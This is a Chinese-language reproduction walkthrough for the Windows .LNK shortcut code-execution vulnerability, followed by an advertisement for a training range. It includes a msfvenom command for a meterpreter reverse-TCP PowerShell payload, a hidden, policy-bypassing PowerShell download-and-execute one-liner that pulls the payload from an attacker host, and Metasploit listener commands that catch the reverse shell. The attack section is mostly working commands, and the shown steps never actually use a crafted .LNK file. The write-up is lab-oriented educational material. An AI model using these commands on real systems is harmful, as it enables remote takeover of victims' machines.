## 0x00漏洞概述

攻击者可以向用户呈现包含恶意的.LNK文件和相关联的恶意二进制文件的可移动驱动器或远程共享。
当用户在Windows资源管理器或解析.LNK文件的任何其他应用程序中打开此驱动器（或远程共享）时，恶意二进制程序将在目标系统上执行攻击者选择的代码，成功利用此漏洞的攻击者可以获得与本地用户相同的用户权限。注：.LNK是windows系统内应用程序快捷方式文件的文件类型后缀名。

Windows系统在解析快捷方式时存在远程执行任意代码的高危漏洞，黑客可以通过U盘、网络共享等途径触发漏洞，完全控制用户系统，安全风险高危

## 0x01影响范围

Microsoft Windows 10 Version 1607 for 32-bit Systems

Microsoft Windows 10 Version 1607 for x64-based Systems

Microsoft Windows 10 for 32-bit Systems

Microsoft Windows 10 for x64-based Systems

Microsoft Windows 10 version 1511 for 32-bit Systems

Microsoft Windows 10 version 1511 for x64-based Systems

Microsoft Windows 10 version 1703 for 32-bit Systems

Microsoft Windows 10 version 1703 for x64-based Systems

Microsoft Windows 7 for 32-bit Systems SP1

Microsoft Windows 7 for x64-based Systems SP1

Microsoft Windows 8.1 for 32-bit Systems

Microsoft Windows 8.1 for x64-based Systems

Microsoft Windows RT 8.1

Microsoft Windows Server 2008 R2 for Itanium-based Systems SP1

Microsoft Windows Server 2008 R2 for x64-based Systems SP1

Microsoft Windows Server 2008 for 32-bit Systems SP2

Microsoft Windows Server 2008 for Itanium-based Systems SP2

Microsoft Windows Server 2008 for x64-based Systems SP2

Microsoft Windows Server 2012

Microsoft Windows Server 2012 R2

Microsoft Windows Server 2016

# 0x02环境搭建

受害机：windows2008R2

攻击机：kali

1\. 在msdn下载存在漏洞版本系统镜像，使用VMware虚拟机安装镜像

Madn下载地址：https://msdn.itellyou.cn/

![](https://image.3001.net/images/20210113/1610502866_5ffe52d2e06f7248f74c9.png!small)  

2.下载完成后使用VMware安装虚拟机。注：安装方法最新百度

![](https://image.3001.net/images/20210113/1610502894_5ffe52eecc5ff3a5745f4.png!small)  

# 0x03漏洞复现

1.打开kali，使用kali下的msfvenom生成一个ps1的shell

msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=192.168.3.6 lport=9999
-f psh-reflection>/root/test/shell.ps1

![bf2be6c115aa41fa91fcba35dd8bb21d~tplv-tt-shrink:640:0.image](https://image.3001.net/images/20200701/1593550745.png!small)

2.将生成的shell.ps1复制到/var/www/html目录下，然后开启apache服务,在浏览器访问shell.ps1文件可直接访问

cp shell.ps1 /var/www/htnl

service apache2 start

![](https://image.3001.net/images/20210113/1610503207_5ffe54279810ed6f14563.png!small)  

![](https://image.3001.net/images/20210113/1610503228_5ffe543c76f262f810204.png!small)  

3.在受害机上在在桌面右键创建一个powersehll远程快捷方式，命令为powershell.exe

powershell -windowstyle hidden -exec bypass -c "IEX (New-Object
Net.WebClient).DownloadString('http://192.168.3.6/shell.ps1');test.ps1"

![](https://image.3001.net/images/20210113/1610503323_5ffe549b4caec1da4042c.png!small)  

![](https://image.3001.net/images/20210113/1610503385_5ffe54d98ebbe758b106e.png!small)  

![](https://image.3001.net/images/20210113/1610503577_5ffe55992ddb07b603a21.png!small)  

4.在kali使用msf配置监听模块，并运行

use exploit/multi/handler

set payload windows/x64/meterpreter/reverse_tcp

show options

set LHOST xxx.xxx.xx.x

set lport 9999

run

![](https://image.3001.net/images/20210113/1610503622_5ffe55c667766ab360219.png!small)  

5.配置完成并运行了之后，在受害机运行刚刚创建的powershell文件，可以看到kali反弹了shell

![](https://image.3001.net/images/20210113/1610503645_5ffe55ddbb2f1023899d5.png!small)  

# 0x04修复建议

1.建议安装官方补丁

2.安装防护软件

  

  

在这里，给大家介绍一下“东塔攻防世界靶场”

2020年12月，东塔攻防世界靶场正式对外提供注册，各位小伙伴可通过注册后进行体验。新注册用户可获得一定的积分，对于靶场使用获取正确的Key后，也可以获取一定的经验值，经验值根据排名会不定期给予一定的奖励。

并且，在操作过程中，针对出现的Bug和安全漏洞问题可以和塔塔子提出，审核通过后可以获得相应的奖励积分。

东塔攻防世界网站不定时推出可免费限时使用的靶场，具体可关注东塔网络安全学院推出的一系列活动或添加东塔客服了解详情。

东塔攻防世界靶场主要分为在线靶场和职业体系两大特色板块。且平台内的靶场会定期更新内容，尤其是最新漏洞复现的一些文章和靶场，会优先在靶场中提供环境让大家体验。

东塔攻防世界网站会不定期限时免费推出最新的一些复现的靶场，以供学习交流，给了大家充分体验和使用靶场的机会。

具体可关注东塔网络安全学院推出的一系列活动或添加东塔客服wx（dongtakefu）了解详情。

除了以上介绍的内容，还有更多宝藏区域，更强大的功能，等你来寻宝！

详戳下方“东塔攻防世界靶场”网址，Get一波新世界

https://labs.do-ta.com

  

